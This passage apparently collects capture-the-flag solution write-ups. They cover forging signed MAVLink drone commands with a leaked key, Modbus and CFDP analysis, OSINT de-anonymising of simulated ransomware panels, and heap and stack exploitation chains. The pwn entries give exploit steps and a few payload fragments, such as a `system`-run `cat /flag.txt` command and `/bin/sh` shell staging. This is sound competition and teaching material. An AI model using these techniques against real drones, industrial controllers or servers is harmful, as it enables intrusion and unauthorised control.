The four fragments have distinct consecutive indices, the concatenated Base32 decodes cleanly to printable text, and the token has the expected length for the prefix scheme.

### Severed Link
Network · Easy · Teodor Giurgica
Points at solve: 120

**Approach**

1. The brief: a drone ISR link runs MAVLink 2 with per-frame signing, operator sysid 255 and drone sysid 1. Mid-mission the signing key was rotated, and the rotation was pushed in band over the same link that is in the capture.
2. Parsed `mission.tlog` with pymavlink and pulled the single `SETUP_SIGNING` frame; its `secret_key` field is the rotated key in clear.
3. Confirmed it was the key actually in use by recomputing the MAVLink signature — `sha256(key + header + payload + crc + link_id + timestamp)[:6]` — over the signed frames; every frame from just before the rotation onward verified.
4. The live uplink is a MAVLink 2 TCP endpoint. On connect it sends a signed STATUSTEXT asking the client to authenticate as the operator, and it only requires valid signatures with a current timestamp; replayed frames are refused.
5. Enabled outgoing signing with the leaked key and a fresh timestamp, sent a signed `HEARTBEAT`, then a signed `COMMAND_INT DO_REPOSITION` from sysid 255.
6. The server accepted the reposition and returned the audit receipt.

**Why it works**

Key rotation over the same channel it protects gives the attacker the key for free. Signing then proves possession, not identity, and the endpoint treats a valid signature from the operator sysid as authentication.

**Validation**

The recovered key verifies every signed frame after the rotation and none before it, which pins the rotation instant, and the live endpoint rejected no signed message. The key itself is omitted here because it is credential material.

### Silent Orbit
Network · Easy · Cosmin Gorea / HiveHack
Points at solve: 120

**Tools used:** Python `struct`, plus the CCSDS 727.0-B-5 specification shipped in the handout.

**Approach**

1. Verified the bundle against `SHA256SUMS`, then followed `README.txt` and `mission-profile.txt`.
2. Walked the capture as raw concatenated CCSDS Space Packets: a six-byte primary header (`PID`, sequence, `PDL`) then `PDL + 1` user-data bytes. All 188 packets consumed the stream exactly.
3. Selected CFDP transaction `1/7/2` and parsed each PDU header to the CCSDS table. A Metadata PDU declared a 192-byte file, file-data PDUs filled intervals, and an EOF PDU closed with the same size.
4. Merging the accepted extents left twelve one-byte gaps at offsets 5, 19, 35, 51, 68, 83, 101, 119, 138, 154, 171 and 187.
5. Encoded those half-open intervals in a CFDP NAK with scope `[0,192)` and rendered the complete PDU as uppercase hex; that hex is the flag body.

**Why it works**

A CFDP NAK is the complement of the received byte map over a declared scope, so the answer depends only on coverage. The header-plus-data-field length identity makes the parse self-checking: a wrong field width overruns or underruns its packet.

**Validation**

All 188 are consumed; the twelve gaps are maximal one-byte intervals; the rebuilt NAK is 112 bytes with a `0x0069` data-field length matching its payload. The README notes the platform brief specified a different parser and format; the handout replay is the evidence.

### Water Hammer Reconciliation
Network · Medium · Cosmin Gorea / HiveHack
Points at solve: 270

**Approach**

1. `reserve-header.pcapng` is one clean TCP connection to port 502 — Modbus/TCP. The solver parses the pcapng blocks, reassembles both TCP streams (no gaps, duplicates or reordering), and splits them into Modbus ADUs.
2. `station-profile.txt` defines which writes count and how to turn them into the flag.
3. Removed the decoys the profile names: two pairs of transaction IDs are plain register reads outside any write-then-readback sequence; one write got an FC16 exception response (code 04); one write never got a response.
4. The 64 writes with transaction IDs `2000…242F` are each a valid FC16 to registers `0x1000–0x1003` on unit 17, each followed immediately by an FC03 read of all four registers whose returned values match what was written.
5. For each confirmed write, the profile's formulas give a velocity, a surge quantity and a per-row "unsafe" bit (armed, ramp below threshold, surge over limit, velocity changed from the previous row). The 64 bits form an 8-byte mask.
6. The report — header, one line per write, mask — is SHA-256 hashed and the first 24 bytes Base32-encoded.

**Why it works**

A write only counts as an attack if the device accepted it and read back the same values; exception responses and unanswered writes are noise. The per-row predicate then reduces 64 writes to a bitmask that is stable and exactly reproducible.

**Validation**

The profile's own sample vector hashes identically, confirming the serialiser, and all 64 confirmed writes have matching readbacks.

## OSINT

### Cloudflare Deanon: Find the Back Office
OSINT · Medium · Created by Covert Security
Points at solve: 327

**Tools used:** FOFA, Shodan and a browser.

**Approach**

1. Started from the unique NestEgg Capital origin established in the sibling task. The earlier FOFA result and a direct page check had already separated it from the Cloudflare edge.
2. Shodan's passive record for that one IPv4 showed an HTTP service on port 8080 titled `NestEgg CRM | Backend`.
3. Opened the root of that already identified service once. The heading identified the NestEgg CRM backend and displayed a hot-wallet admin key, which was submitted verbatim.

**Why it works**

The backend was served by the confirmed origin on a port shown by the passive host record, so the candidate set was one host. Reading the page directly ties the displayed key to the simulated NestEgg backend; no address or key candidates had to be generated.

**Validation**

The submitted key was accepted by the platform. No port scanning or path enumeration was performed — the service was found in the passive record, not by probing.

### Cloudflare Deanon: Find the Origin
OSINT · Medium · Created by Covert Security
Points at solve: 320

**Approach**

1. The briefing asked for the clear-web IPv4 of the server hosting the simulated NestEgg Capital site.
2. Searched FOFA for the site title and found a candidate on HTTP port 80.
3. Connected directly to that IPv4, bypassing any proxy, and compared the response with the indexed result.
4. The request returned HTTP 200 from nginx with the expected page title. The ETag and Last-Modified values also matched the FOFA record.
5. Recorded the peer address and headers as evidence.

**Why it works**

A CDN hides the origin, but the origin still has a public TLS/HTTP fingerprint that scanners index. Matching the exact title plus the ETag and Last-Modified — values the edge does not rewrite — distinguishes the real origin from a lookalike or a cached copy.

**Validation**

Three independent response attributes (title, ETag, Last-Modified) match the indexed record, and the address answered directly rather than through the edge. The address itself is the answer and is omitted here.

### Cloudflare Deanon: Read the Platform
OSINT · Easy · Created by Covert Security
Points at solve: 120

**Approach**

1. The call note supplies the only seed needed: the site address, described by the customer as the NestEgg Capital investment site, "licensed by the Lower Dunwich Financial Supervisory Board".
2. This is Task 1 of the pair — read the platform, not find its origin (that is the sibling challenge).
3. Fetched the public page and searched for the registration number. It is not buried: it appears in the `<title>`, the meta description, the header bar and the licensing line.
4. One pattern match over the saved HTML returns a single unique value.

**Why it works**

The challenge is deliberately split: the interesting work of de-anonymising the host is the sibling task, and this one only asks what the site claims about itself. The answer boundary explicitly says the displayed value is the answer, which closes the registry-lookup shortcut.

**Validation**

The saved page shows the same registration number in four independent places, and the unique pattern match returned one value. The number itself is the answer and is omitted here.

### Harvest
OSINT · Medium · Kevin Sander
Points at solve: 270

**Approach**

1. Used the radio instructions to check the number of cipher groups, then decoded the intercepts with the Vigenère keys taken from the flight schedule.
2. The first report had 21 groups as declared and decrypted with the callsign key of the aircraft it named. It reported delivery at a field site at 10:20 MSK, four pieces, codeword `SNOP`.
3. The logistics sheet identifies that site as the harvested field west of the dairy farm at Mirnoe, and `SNOP` as a portable electronic-warfare jamming set.
4. The second intercept had 25 groups despite a check group of 24 — a transcription error that invalidates it.
5. The public story pointed to a different, closed landing site and an aircraft that was out of service, so it was discarded.
6. Combined the verified landing site and the cargo codeword.

**Why it works**

The group count is a self-check: a message whose declared length disagrees with the number of groups cannot be trusted, regardless of how plausible its plaintext reads. Corroborating the site against the logistics sheet turns a decrypted place-name into a real location.

**Validation**

The accepted report has a matching group count, decrypts to coherent Russian-language traffic, and both its site and codeword are independently listed in the logistics sheet.

### Onion Deanon 1: Find the Back Office
OSINT · Medium · Created by Covert Security
Points at solve: 329

**Tools used:** Censys and a browser.

**Approach**

1. Reused the unique origin established in the sibling Find the Origin task.
2. Its Censys host record showed an HTTP service on port 8080.
3. Visited the root of that one service. The page title was `ParsnipLocker Internal Ops`, and the heading identified an internal negotiation panel.
4. The victim table contained the same victim company and case identifier as the original ransom note.
5. The panel displayed an access-token UUID, which was submitted exactly as printed.

**Why it works**

The panel sat on a service already identified by the passive host record, so no scanning was needed. The victim and case match ties the displayed token to this challenge rather than to another tenant or an unrelated service.

**Validation**

The submitted UUID was accepted by the platform. No paths were enumerated, no ports scanned, and no candidate tokens generated.

### Onion Deanon 1: Find the Origin
OSINT · Medium · Created by Covert Security
Points at solve: 309

**Tools used:** Tor Browser and Censys.

**Approach**

1. Took the leaf certificate's SHA-256 fingerprint from the sibling Fingerprint task and searched for that exact fingerprint in Censys's certificate dataset.
2. The certificate record had the same onion Common Name and serial as the one read in Tor Browser.
3. Its Related Assets tab showed three web properties and one host.
4. Opened the host record: its port 443 TLS fingerprint matched the onion certificate exactly. The IP-based web property showed the same fingerprint.
5. The other related properties were hostnames, so the IPv4 host record was used for the answer.

**Why it works**

The task asks for the one clear-web IPv4 presenting the same leaf certificate. Matching the certificate fingerprint against the host's current TLS service is stronger evidence than a domain name, a relay address, or a historical association.

**Validation**

The certificate record, the related host record and the port 443 fingerprint all agree with the value read in Tor Browser, and the submitted address was accepted. No address range was scanned.

### Onion Deanon 1: Fingerprint the Certificate
OSINT · Easy · Created by Covert Security
Points at solve: 120

**Approach**

1. Used the certificate viewer for the same onion service as the Read the Certificate task.
2. Under Fingerprints, copied the leaf certificate's SHA-256 fingerprint.
3. Kept the viewer's uppercase hexadecimal pairs and colons, as the task specified.

**Why it works**

A SHA-256 fingerprint identifies the exact certificate bytes, so it survives a change of address or hosting. The serial read in the previous task confirms it is the same leaf certificate and not an intermediate or a Tor relay certificate.

**Validation**

The fingerprint is 32 bytes, displayed as 32 colon-separated hex pairs, and the submitted value was accepted by the platform.

### Onion Deanon 1: Read the Certificate
OSINT · Easy · Created by Covert Security
Points at solve: 120

**Approach**

1. Opened the onion address from the ransom note in Tor Browser.
2. From the site information panel, went to Secure Connection → More Information → View Certificate.
3. Read the leaf certificate's serial number. The viewer separated its hexadecimal bytes with colons; the challenge wanted the same bytes in uppercase with the separators removed.

**Why it works**

The serial comes from the certificate the named service actually presented, rather than from page text or from a certificate belonging to a Tor relay — a distinction that matters because the circuit passes through relays whose certificates are unrelated.

**Validation**

Checked the serial's byte order and formatting against the viewer before submitting; the answer was accepted by the platform.

### Onion Deanon 2: Find the Back Office
OSINT · Medium · Created by Covert Security
Points at solve: 0

**Tools used:** Censys and `curl`.

**Approach**

1. Reused the single origin verified in the sibling Find the Origin task. Its Censys record listed HTTP on ports 80 and 8080, so there was no need to scan for a management service.
2. Port 80 served the public negotiation page and identified the victim as case `CC-0417`. Port 8080 served a page titled with the group's admin branding.
3. Its case table included `CC-0417`, and its form opened a ticket with `GET /ticket?case=<case-id>`.
4. Followed that form for the case already displayed, and the ticket printed a decryption-key UUID, which was used exactly as shown.

**Why it works**

The admin service was exposed on a port already documented by the passive host record, and its own case table plus form led directly to the victim's ticket. The key came from the panel rather than from a generated token or a guessed path.

**Validation**

The ticket showed both the expected case ID and the victim name next to the decryption key, and the submitted UUID was accepted. All HTTP requests were reads to the single confirmed origin.

### Onion Deanon 2: Find the Origin
OSINT · Medium · Created by Covert Security
Points at solve: 0

**Tools used:** Tor Browser, Censys, Python and `curl`.

**Approach**

1. Opened the onion portal in Tor Browser. Its HTML declared `/favicon.ico`, so that icon was saved without trying other paths.
2. Hashed the raw icon bytes and computed the Shodan-style signed favicon hash. Shodan required a login for the favicon filter, so the SHA-256 was used in Censys instead.
3. The exact `host.services.endpoints.http.favicons.hash_sha256` query returned one host.
4. Censys showed the favicon match on its port 80 HTTP service. Opened only that host and checked its page title, branding and the victim case against the onion page.

**Why it works**

The icon is a byte-for-byte fingerprint of the portal. An exact favicon match yields a candidate, and the live page content ties that candidate to the specific victim portal instead of relying on a historical or unrelated index hit.

**Validation**

The Censys result count was one, the matched field was the favicon SHA-256, and the host served the same negotiation page with the same case. The submitted address was accepted; no range guessing or host scanning was needed.

### Onion Deanon 2: Hash the Favicon Again
OSINT · Easy · Covert Security
Points at solve: 0

**Tools used:** Python `hashlib`.

**Approach**

1. Saved the raw `favicon.ico` response from the DarkPigeon portal, continuing from the Onion Deanon 2 origin task rather than starting new reconnaissance.
2. Checked the saved icon's SHA-256 against the `favicon.ico` saved for Onion Deanon 2: Find the Origin. The hashes matched, confirming the same icon was being hashed.
3. Computed MD5 directly over the ICO file's bytes, with no decode, resize or re-encode through an image library.
4. Submitted the 32-character hexadecimal digest as the flag body.

**Why it works**

MD5 is deterministic over the exact byte string, so the digest is reproducible from the saved icon alone. The SHA-256 cross-check guards against hashing a different or re-fetched copy: identical SHA-256 means identical bytes, and therefore the same MD5.

**Validation**

The digest is 32 lowercase hex characters and recomputes from the sibling task's saved `favicon.ico`. This was a 0-point card; the README records the SHA-256 match but no separate acceptance transcript.

### Onion Deanon 2: Read the Favicon
OSINT · Easy · Created by Covert Security
Points at solve: 120

**Tools used:** Tor Browser and Python.

**Approach**

1. Opened the onion portal in Tor Browser and viewed its page source.
2. The HTML declared `/favicon.ico`, so that exact response was saved.
3. Implemented Shodan's favicon method: base64-encode the raw icon with line wrapping, then compute signed MurmurHash3 x86 32-bit over the encoded bytes.
4. Submitted the resulting signed integer.

**Why it works**

The hash is defined over the complete raw favicon response in a specific encoding. Hashing an individual icon frame, omitting base64 line breaks, or treating the 32-bit output as unsigned all produce a different value — which is exactly what the task is testing.

**Validation**

The saved ICO is 6,434 bytes, its SHA-256 matched a separate local checksum, and the signed MurmurHash3 result was accepted by the platform.

<!-- SECTION: FLAGSHIP CARDS 9164 / 9165 — owner: flagship-cards lane (mar). Silent Ward is card 9159 above. -->

## Pwn

### echo_chamber
Pwn · Hard · Iulian Schifirnet
Points at solve: 540

**Tools used:** `pwntools`; an isolated x86-64 VM; the shipped glibc 2.35.

**Approach**

1. Full RELRO, PIE, canary and NX. A 0x50 buffer at `rbp-0x60` is read with 0x70 bytes, so the overflow reaches exactly one return address — no chain fits, and there is no `pop rdi` for a leak.
2. The echo loop recomputes the buffer as `lea -0x60(%rbp), %rax` every iteration, and `leave` is the only gadget. Returning into the echo branch with a forged `rbp` is an arbitrary read, an arbitrary write and a fresh return address at once.
3. Leaked the canary and saved stack pointer by sending 0x59 bytes so the last overwrites the canary's NUL and `%s` walks through it.
4. Leaked the PIE base by filling through the saved `rbp` so `%s` runs into the return address.
5. Leaked libc by forging `rbp` so the echo branch prints the return address inside `__libc_start_call_main`, whose offset was measured under gdb because the symbol is local.
6. Pivoted into `leave; ret` with `rbp` at a relocated buffer holding `pop rdi; "/bin/sh"; ret; system`.

**Why it works**

An unoptimised loop that recomputes its buffer pointer from `rbp` turns the single epilogue gadget into a universal read/write/pivot primitive — enough to leak everything and reach a one-shot ROP.

**Validation**

Every address is leaked, nothing guessed. About 3% of runs have a NUL that truncates `%s`; the solver length-checks each leak, asserts page alignment and retries at most four times. Shell reproduced 10/10 locally.

### forge
Pwn · Medium · Iulian Schifirnet
Points at solve: 270

**Tools used:** `pwntools`; an isolated x86-64 VM for local runs.

**Approach**

1. The shipped source comments the intended path — House of Force against glibc 2.27 — and the version matters, since 2.29 added the top-chunk sanity check that kills it.
2. The bug is one argument: `read_until_nl(p + strlen(p), notes[i].size)` should have been `size - strlen(p)`, so a full note writes past its chunk. The reader never NUL-terminates, and allocation accepts any size.
3. Heap base: `tcache_get` pops an entry without clearing its `next`. Allocate two 0x20 notes, free both, allocate again — the returned chunk still points at the other.
4. libc base: a 0x500 chunk is above the tcache ceiling, so freeing it leaves `main_arena` in `fd`/`bk`; an 0x88 guard note stops it merging into top. Re-allocate and read them back.
5. House of Force: a 0x18 note filled with 0x18 bytes ends at the top chunk's size field, so `strlen` runs into it and the append overwrites the top size with `0xff…`. `malloc` will now return any address.
6. Relocate top to the hook region, write `system`, then free the note holding `/bin/sh`.

**Why it works**

House of Force turns the top chunk's size into an attacker-controlled bound, so one oversized request moves top to any address and the next allocation returns it.

**Validation**

Both leaks are length-checked and page-aligned, with at most four fresh-connection retries; shell reproduced 10/10 locally, first try remote. Dead end worth recording: `__free_hook` is 8 mod 16 while chunks are 16-aligned, so the target must be the aligned `__after_morecore_hook`, written across sixteen bytes.

### Phantom Device
Pwn · Hard · Ahmed Abdelmoemen
Points at solve: 875

**Tools used:** a purpose-written Python AFC *device* emulator (raw sockets, ~200 lines), gdb with scripted breakpoints for the local chain, the shipped `libc.so.6` for symbols and `.data` reconstruction, `/proc/<pid>/mem` to confirm heap offsets locally. No stock exploit tooling — the target speaks a protocol we had to answer by hand.

**Approach**

1. Establish who is who. The handler runs the vulnerable client with the socket on stdin/stdout and `stderr` also on the socket, while the client redirects its own stdout to `/dev/null`. So we are the *device*, the client is the victim, and any command output has to come back on a descriptor the client owns — stderr works, and so does fd 0, which is the socket.
2. Learn the client's fixed request sequence by answering it: two directory listings, a device-info query, a file-info query, a third listing, then three open/read/close triples. Replies are `CFA6LPAA` + four little-endian u64s (`entire_length`, `this_length`, `packet_num`, `operation`) + body; `packet_num` must be the request's `pn + 1` or the stream desynchronises.
3. Find the bug in `afc_receive_data`: it `malloc()`s `entire_length - 40` but `recv()`s `this_length - 40`, with no `this <= entire` check. Two independent length fields, one packet, linear heap overflow.
4. Measure the receive path before designing the payload. It does exactly one `recv()` per reply, so a body is delivered only if it fits one segment: 1,024- and 1,064-byte bodies arrive whole, 1,200 and above come back short. That single measurement decides the shape of the whole exploit.
5. Leak libc through the file handle. `afc_file_open()` does `memcpy(handle, body, 8)` without checking the body length, so a one-byte reply leaves seven stale heap bytes in the handle — and the client echoes that handle at the start of the next read request. Groom the heap so the stale bytes are an arena pointer, and the handle gives libc base directly.
6. Leak the heap page from the second open: the same stale handle is now a safe-linked tcache `fd` (`target ^ (chunk >> 12)`). The low byte is lost to our own filler byte, but iterating the 12-bit recurrence over the page offset recovers the page exactly — which is what makes every later poison encodable.
7. Poison two tcache bins from two different overflow sites (a parse array and a file-info buffer), because a bin can only be poisoned once: after the target is popped, the head decodes to garbage.
8. Write libc's `.data` back in two hops, each a faithful relocated copy for its range — this libc uses packed relative relocations (`DT_RELR`), so replaying only the classic relocation table leaves every pointer unrelocated and `exit()` dies before stdio cleanup. Hop 1 also forges the next chunk's size so hop 2 frees cleanly; hop 2 builds a fake `FILE` at `_IO_2_1_stdin_` with a wide vtable whose `__doallocate` is `system`.
9. Send each reply just-in-time as its request arrives. Pre-queuing the pop/hop/pop/hop sequence in one write silently breaks the writes — a crasher variant that core-dumps when sent in order closes cleanly when pipelined.
10. On exit, `_IO_flush_all` walks to the fake stdin, takes the wide branch, and calls `system(fp)` where `fp` is the FILE itself — whose first bytes are the command. The command ends with `>&0` so the output lands on the socket: `cat /flag.txt>&0;echo __DONE__>&0`.

**Why it works**

Three independent defects compose. The unchecked `this <= entire` gives a controlled linear overflow from a single packet; the unchecked `memcpy` of an eight-byte handle turns an uninitialised heap chunk into a leak channel that survives the client's stdout redirection; and tcache poisoning turns "malloc returns an attacker address" into "write into libc's `.data`". The chain needs `_IO_2_1_stdin_` specifically: it is the last member of the flush chain, and a 960-byte write from the only usable chunk header covers a complete FILE plus wide data plus wide vtable — which is what fits under the ~1.1 KB per-reply ceiling. Two hops rather than one, because the image is 4.8 KB and because each poisoned bin is single-use.

**Validation**

The chain was reproduced locally against the shipped client first, printing a marker via `system()`; heap offsets were checked against `/proc/<pid>/mem` on that local run rather than inferred. On the live service every stage had a discriminating test: a wild-pointer variant that must core-dump, a valid one that must not, and a fake-FILE variant with a deliberately invalid lock that crashes at exit only if the write actually landed (clean close when pipelined, core dump when sent just-in-time — that is how the pipelining bug was found). The final run returned the flag on the socket, and it was captured to a file and hexdump-verified before submission. The lane that had declared delivery impossible left no flag file behind; the flag that was submitted came from the two-hop lane and was accepted.
### relic
Pwn · Medium · Iulian Schifirnet
Points at solve: 270

**Approach**

1. The source makes the bug clear: `vault()` reads 0x120 bytes into a 0x40 stack buffer. There is no canary, the binary is non-PIE, and the saved return address is 72 bytes from the buffer start.
2. `vault()` refuses a second visit, so the first read installs a ROP chain that calls `read()` again directly.
3. The binary has the old `__libc_csu_init` gadgets: a six-pop at `0x4012da` and the `rdx`/`rsi`/`edi` setter that calls through `[r15+rbx*8]` at `0x4012c0`.
4. First chain: `write(1, write@GOT, 24)` leaks the resolved `write`, `alarm` and `read` pointers; their offsets match the supplied libc, giving its base.
5. Then `read(0, 0x404c00, 0x400)` places a second stage high in the writable page, and the tail uses `pop rbp; ret` plus `leave; ret` to pivot `rsp` there.
6. The second stage calls `system("/bin/sh")`; `cat flag*` reads the flag through a symlinked path.

**Why it works**

A non-PIE binary with csu gadgets needs only a libc leak to build a full chain. Pivoting high in the page leaves enough stack below `rsp` for `system`, which is why the second stage is not placed at the first convenient address.

**Validation**

The leaked libc offsets match the supplied library exactly, and the shell was obtained locally before the remote run.

### sigil
Pwn · Hard · Iulian Schifirnet
Points at solve: 540

**Approach**

1. The target is 0x100 bytes of `.text`: static, no-PIE, `-nostdlib`, no canary, three functions, and a 60-second alarm. The bug is a plain stack overflow — a 0x40 buffer read with 0x400.
2. The author's comment suggests SROP, but it is not needed and the alternative is simpler. The syscall wrapper is compiled at `-O0`, so it loads `rax`, `rdi`, `rsi` and `rdx` from memory relative to `rbp`, then executes `syscall`.
3. The binary has no `pop rdi` or `pop rsi` — only `pop rbp; ret`. But `pop rbp` is exactly what this construction needs: enter the register-loading instruction with a chosen `rbp` and you have an arbitrary four-argument syscall.
4. A second useful address is the read call site in the listening function: it also derives its destination from `rbp`, making it an arbitrary write, and its `leave; ret` pivots `rsp` onto whatever `rbp` points at.
5. Two reads total: the overflow sets `rbp` into the writable page and returns into that call site; the second read writes a fake frame, the syscall arguments and `/bin/sh` into `.bss`; the second `leave; ret` pivots onto it and the wrapper's tail executes `execve`.

**Why it works**

An unoptimised wrapper that sources its registers from the stack frame turns control of `rbp` into control of every syscall argument. In a binary with no argument-loading gadgets, the function epilogue is the gadget.

**Validation**

Local shell in the VM before any remote contact. With no PIE and no leaked addresses the chain is fully deterministic, so there is nothing to retry.

### stepper
Pwn · Hard · Iulian Schifirnet
Points at solve: 609

**Tools used:** `pwntools`; an isolated x86-64 VM.

**Approach**

1. The service hands out an 8-byte RWX slot twelve times. Each round fills it with NOPs, copies up to six of your bytes to the front and jumps in; a trampoline snapshots registers and returns. Registers persist, the slot does not.
2. `0f 05` (syscall), `0f 34` (sysenter) and `cd` are rejected — but they never have to cross the wire. The page is executable and writable, and each step's six bytes are NOP-padded to the eighth.
3. The last step writes `0f 05` into `code+6` and runs off its own instruction, through two NOPs, into the syscall it just assembled.
4. `0x050f` is built arithmetically with `mov cx, 0x0a1e; shr cx, 1`, because an immediate would put the banned bytes in the stream.
5. `call +0; pop rax` is exactly six bytes and yields a page address despite PIE, anchoring the store.
6. Steps 1–10 stage `execve("/bin//sh", 0, 0)` in registers and on the stack; step 11 plants the syscall and falls into it.

**Why it works**

A writable-and-executable slot plus an input filter is a contradiction: the filter inspects only what crosses the wire, while running code can assemble anything in place.

**Validation**

The payload is checked against the length limit and banned-byte set before sending. The textbook `push '//sh'; push '/bin'` pushes eight sign-extended bytes in 64-bit mode and silently builds `/bin`; the solver now asserts the path.

## Rev

### Carrier Shadow
Rev · Hard · Created by Balint
Points at solve: 540

**Approach**

1. `carrier-shadow` is a stripped x86-64 ELF posing as "hexkit 1.2.0", a hex/checksum utility.
2. The payload is in no data section — it is encoded in the distances between function start addresses. The binary has about 24,800 tiny functions whose addresses come from the lookup table in `.eh_frame_hdr`, each gap encoding one symbol, so the function sizes still look natural.
3. The decoder at `0x995e0` starts with a sync marker: an xorshift32 generator seeded `0x6a2b3c4d` produces eight values of the form `x % 61 + 34`, and the decoder scans for eight consecutive gaps equal to them (found at gap 123).
4. The next six gaps minus 2 give mode (0 → length table at `0x9b340`), length (17,733 bytes) and an XOR checksum byte.
5. Each following gap minus 2 is a symbol 0–255; its canonical Huffman code from the length table is appended to a bitstream.
6. The bytes are XORed with the xorshift stream, yielding raw DEFLATE; inflating gives a second-stage ELF of 34,192 bytes.
7. The stage-2 ELF prints an Operation Dawn authorization string and substitutes the flag from its `.rodata`. Everything was static — nothing was executed.

**Why it works**

Code layout is not normally treated as data, so an address-gap channel survives every string and entropy scan. The Huffman layer then compresses the payload so the gap arithmetic stays in a plausible range for function sizes.

**Validation**

The sync marker matches at exactly one offset, the Huffman stream inflates cleanly to a valid ELF, and the stage-2 binary contains the expected format string and flag in `.rodata`.

## Reverse engineering

### Command Authority
Reverse engineering · Easy · BitR1ft
Points at solve: 120

**Approach**

1. The evidence ZIP contained `id_photo.jpg` and an encrypted `pass_bundle.zip`.
2. Checked the bytes after the JPEG's `FF D9` end marker and found an `ARCHIVE-KEY` trailer.
3. That value opened the inner ZIP and yielded a token and the `field_verifier` ELF.
4. Inspected the verifier's `command-authority` branch: it reads 31 bytes starting at file offset `0x2120` and XORs each byte with `0x41`.
5. Applying that transform to the bytes produced the clearance value.

**Why it works**

A JPEG ends at `FF D9`, so anything after it is ignored by every image viewer but preserved by the file. The key was stored out of band in that slack space, and the inner archive then supplied both the target binary and the branch to read.

**Validation**

The trailer key decrypts the archive, the extracted ELF is well-formed, and the branch's offset and XOR constant are read from the disassembly rather than guessed.

### Fence Shift
Reverse engineering · Medium · Teodor Giurgica
Points at solve: 270

**Tools used:** `pymavlink` for the capture.

**Approach**

1. Disassembled the stripped `fcu` and followed the `fence` command. Its 28-byte little-endian block stores latitude, longitude, radius, altitude ceiling, east offset, north offset, margin percent and a format tag.
2. Coordinates, ceiling and offsets are signed 32-bit; radius is unsigned 32-bit; the last two fields are unsigned 16-bit and the tag is `0x5346`.
3. The controller applies the percentage margin to the radius with integer division, then converts radius and signed centre offsets from centimetres to e7 units by multiplying by `8983/10000` and rounding ties away from zero.
4. It accepts a request when the squared distance from the shifted centre is at most the squared radius and the altitude in centimetres is at most the ceiling.
5. Decoded MAVLink 2 from `mission.pcapng`. The first aircraft position fixed the initial centre; the aircraft provisioned a 4000 cm radius, 12000 cm ceiling, zero offsets and zero margin.
6. Applied each ground `PARAM_SET` only after its matching aircraft `PARAM_VALUE`; the route manager's acknowledgements show it queued the requests.
7. Numbered the 22 ground `MAV_CMD_DO_REPOSITION` requests from zero and ran the recovered predicate against both the active and provisioned state.

**Why it works**

The fence predicate is pure integer geometry, so once the constants and rounding rule are recovered the verdict for each command is deterministic. Replaying parameter state in acknowledgement order is what makes the two masks differ.

**Validation**

The two masks are distinct and stable, and each bit traces to a specific command and state pair. Flags are omitted here because they are the answer.

### Ghost Bank
Reverse engineering · Hard · Chronos Security
Points at solve: 546

**Approach**

1. The bench exposes a halted controller over a raw debug-stub protocol. The controller never executes, so the firmware is not code to run but a specification to replay: we perform its device-register sequence ourselves and do its cryptography offline.
2. Disassembled the 956-byte AArch64 flat image: a main loop, a `mix()` scrambler (xor constant, xorshift/rotate, two 64-bit multiplies — splitmix-like), a ChaCha20 block function with the standard constant string, and a nonce with the counter starting at 1.
3. Reimplemented `mix()` in Python and verified it byte-exactly against the shipped capture before touching the live bench.
4. Built a local mock bench so the client could be debugged offline; the live bench then saw only a handful of hand-driven requests.
5. Replay: write the unlock value, read the challenge, select the page, write the mixed key halves, step the control register twice. The key page then exposes the 32-byte ChaCha key.
6. The firmware selects page 7, which looks like the data bank — but page 7 is a decoy of random bytes. Sweeping all sixteen pages and reading the ciphertext-length register found the real ciphertext on page 3: 131 bytes there, zero everywhere else.

**Why it works**

Nothing is broken cryptographically. The firmware is a complete, readable description of the unlock protocol, and a halted CPU cannot object to someone else performing it.

**Validation**

`mix()` reproduces the capture byte-exactly, and the recovered plaintext is a well-formed tasking record rather than a fragment. The capture's recorded key is stale as the brief warns, so the key is recomputed per run.

### Ground Lock
Reverse engineering · Easy · Chronos Security
Points at solve: 120

**Approach**

1. A 682 KB statically linked, stripped ELF. `main` was located by cross-referencing the program's own strings rather than reading through hundreds of kilobytes of static glibc.
2. The check: `argc == 2`, length exactly 24, then for each of three 8-byte little-endian blocks compare `f(k)` against a stored target.
3. `f` is MurmurHash3's fmix64 with its constants inlined. Recognising it turned the task from a search into an inversion.
4. The parameter block in `.rodata` holds seven quadwords — two multipliers, the shift, the block count, then the three targets. The code indexes it as `base + 8*(i+4)`, which is what identifies entries 4–6 as the targets.
5. fmix64 is a bijection: `x ^= x >> 33` is its own inverse on 64 bits (the shift discards more than half the word, so the top 31 bits survive and regenerate the rest), and both multipliers are odd, so each multiply inverts with a modular inverse mod 2⁶⁴.

**Why it works**

The author used an avalanche finaliser as if it were a one-way function. It is not — it is invertible by construction, so no searching is required at all.

**Validation**

The inverted targets decode to clean ASCII little-endian in all three blocks, which a wrong inversion would not. The recovered code was then run against the real binary inside an isolated VM: it releases the interlock and exits 0, while a wrong code is denied and exits 1. A flag-format string found in the binary was treated as a planted template, not a flag.

### HELIOS-RTU
Reverse engineering · Hard · Ionut Coserea
Points at solve: 540

**Tools used:** a Python WebSocket client of our own; `avrdude`; `radare2` with AVR support.

**Approach**

1. The ICSP header returns the ATmega328P signature and fuses: lock mode 3, SPIEN set, DWEN clear, BOOTRST set.
2. Two offered adapters are decoys, and the fuses prove it: the part has no JTAG and debugWIRE is fused off.
3. Lock bits restrict external programming, not the bootloader's reads of its own flash, so a USB-serial dump yields the full 2 KB image. The boot section reads back erased, and the AES key lives there.
4. A hidden service command is absent from help and must be reinstalled each connection.
5. `sign` rejects a record whose first byte is the directive marker and otherwise returns its raw AES-128. `exec` checks `tag == AES(B2 ^ AES(B1))` — plain CBC-MAC, zero IV, no subkeys — then requires the marker, a command byte and the live nonce.
6. Forged the tag with `T1 = sign(B1)` and `tag = sign(B2 ^ T1)`; masking removes the prefix the guard looks for.

**Why it works**

`sign` is an encryption oracle for exactly the primitive the MAC uses, and CBC-MAC without length encoding or distinct subkeys is existentially forgeable.

**Validation**

The absence of CMAC subkeys was confirmed in disassembly before the forgery. Only a handful of hand-written commands reached the instance.
### Operation Dawn: Radio Recovery
Reverse engineering · Easy · Terminal43
Points at solve: 120

**Approach**

1. A 1 MiB flash image with real content in the first ~17 KB; the rest is `0xff` fill.
2. The container format read off the hexdump: magic `DWFW`, version, record count, then 20-byte records of `{name, offset, size, crc32}`.
3. Verified every CRC32 before trusting any part; all four pass.
4. The root filesystem's zlib stream has `FDICT = 1`, so it needs a preset dictionary whose adler32 is the 4-byte `DICTID`. The message catalogue's adler32 matches, so the catalogue is the dictionary — identified by matching DICTID, not by trial inflation.
5. Inflating gives a cpio archive. One config holds a 60-hex admin token; one init script is the recovery routine, plainly `plain[i] = token[i] XOR mac[i mod 6]`.
